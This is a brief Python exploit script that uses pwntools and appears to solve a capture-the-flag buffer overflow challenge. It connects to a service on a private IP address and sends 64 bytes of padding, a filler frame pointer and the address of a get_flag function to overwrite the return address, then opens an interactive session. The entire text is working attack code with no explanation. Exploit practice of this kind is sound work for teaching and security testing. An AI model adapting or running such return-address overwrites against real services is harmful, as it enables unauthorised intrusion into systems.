from pwn import *

r = remote('172.17.0.13', 14435)

GET_FLAG = 0x004011d6

OFFSET = 64

payload = b'A' * OFFSET + p64(0xdeadbeef) + p64(GET_FLAG)

r.recvuntil(b': ')
r.sendline(payload)
r.interactive()